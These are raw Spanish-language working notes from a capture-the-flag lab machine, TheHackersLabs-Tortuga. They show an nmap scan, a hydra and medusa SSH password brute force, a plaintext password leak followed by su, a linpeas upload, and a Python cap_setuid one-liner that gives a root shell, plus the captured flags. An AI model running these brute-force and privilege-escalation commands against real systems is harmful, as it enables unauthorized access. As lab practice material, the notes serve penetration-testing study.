nmap -p22,80 -sV -sC -Pn -vvv -n 192.168.56.108 -oN fullScan.txt


----------------------------



hydra -l grumete -P /usr/share/wordlists/rockyou.txt -t 4 ssh://192.168.56.108

medusa -h 192.168.56.108 -u grumete -P /usr/share/wordlists/rockyou.txt -M ssh


└─$ hydra -l grumete -P /usr/share/wordlists/rockyou.txt -t 4 ssh://192.168.56.108
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-07 19:48:30
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking ssh://192.168.56.108:22/

[22][ssh] host: 192.168.56.108   login: grumete   password: 1234

1 of 1 target successfully completed, 1 valid password found




grumete:1234
-------------------------------------

┌──(kali㉿kali)-[~/Documents/tortuga]
└─$ ssh grumete@192.168.56.108                 
grumete@192.168.56.108's password: 
Linux TheHackersLabs-Tortuga 6.1.0-38-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.147-1 (2025-08-02) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Sep  7 23:48:37 2025 from 192.168.56.103
grumete@TheHackersLabs-Tortuga:~$ ls -la
total 28
drwxr-xr-x 2 grumete grumete 4096 sep  5 13:23 .
drwxr-xr-x 4 root    root    4096 sep  5 11:49 ..
lrwxrwxrwx 1 grumete grumete    9 sep  5 11:59 .bash_history -> /dev/null
-rw-r--r-- 1 grumete grumete  220 abr 23  2023 .bash_logout
-rw-r--r-- 1 grumete grumete 3564 sep  5 11:48 .bashrc
-rw-r--r-- 1 root    root     791 sep  5 13:23 .nota.txt
-rw-r--r-- 1 grumete grumete  807 abr 23  2023 .profile
-r-------- 1 grumete grumete   33 sep  5 11:55 user.txt
grumete@TheHackersLabs-Tortuga:~$ cat user.txt 
26411abdb6301c1d28617bd5ac7ec81b
grumete@TheHackersLabs-Tortuga:~$ cat .nota.txt 
Querido grumete,

Parto rumbo a la isla vecina por asuntos que no pueden esperar, estaré fuera un par de días. 
Mientras tanto, confío en ti para que cuides del barco y de la tripulación como si fueran míos. 

La puerta de la cámara del timón está asegurada con la contraseña: 
    "mar_de_fuego123"  

Recuerda, no se la reveles a nadie más. Has demostrado ser leal y firme durante todos estos años 
navegando juntos, y eres en quien más confío en estos mares traicioneros.

Mantén la guardia alta, vigila las provisiones y cuida de que ningún intruso ponga un pie en cubierta.  
Cuando regrese, espero encontrar el barco tal y como lo dejo hoy (¡y nada de usar la bodega de ron 
para hacer carreras de tortugas otra vez!).  

Con la confianza de siempre,  
— El Capitán
grumete@TheHackersLabs-Tortuga:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
messagebus:x:100:107::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:101:108:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
sshd:x:102:65534::/run/sshd:/usr/sbin/nologin
capitan:x:1001:1001::/home/capitan:/bin/bash
grumete:x:1002:1002::/home/grumete:/bin/bash
grumete@TheHackersLabs-Tortuga:~$ su capitan 
Contraseña: 
capitan@TheHackersLabs-Tortuga:/home/grumete$ 



-----------------

Opción 1: Si quieres ejecutar linpeas.sh en la máquina remota (192.168.56.108)
Como ya tienes linpeas.sh localmente, puedes subirlo a la máquina remota:


scp linpeas.sh capitan@192.168.56.108:/tmp/linpeas.sh


ssh capitan@192.168.56.108

chmod +x /tmp/linpeas.sh

cd /tmp && ./linpeas.sh





Files with capabilities (limited to 50):
/usr/bin/ping cap_net_raw=ep
/usr/bin/python3.11 cap_setuid=ep



-------------------



¡El binario crítico es: /usr/bin/python3.11 cap_setuid=ep**
Python 3.11 tiene la capacidad de cambiar su UID (como si fuera sudo). Esto significa que puedes usarlo para ejecutar comandos como otro usuario (¡incluyendo root!).

💥 Explotación directa:
Opción 1: Obtener una shell como root
Ejecuta:

bash
/usr/bin/python3.11 -c 'import os; os.setuid(0); os.system("/bin/bash")'
Esto cambiará el UID a 0 (root) y lanzará una shell.

Opción 2: Ejecutar cualquier comando como root
bash
/usr/bin/python3.11 -c 'import os; os.setuid(0); os.system("whoami")'




Por qué funciona?
cap_setuid=ep le da a Python la capacidad de usar setuid() para cambiar al usuario que quieras (incluyendo root).

Normalmente solo root puede usar setuid(0), pero Python tiene este privilegio gracias a la capability.



/usr/bin/python3.11 -c 'import os; os.setuid(0); os.system("/bin/bash")'



oot@TheHackersLabs-Tortuga:/home/grumete# ls
user.txt


root@TheHackersLabs-Tortuga:/# cd root/
root@TheHackersLabs-Tortuga:/root# ls
root.txt

root@TheHackersLabs-Tortuga:/root# cat root.txt 
c3f63456632bd27e1d5602827c2b59ae

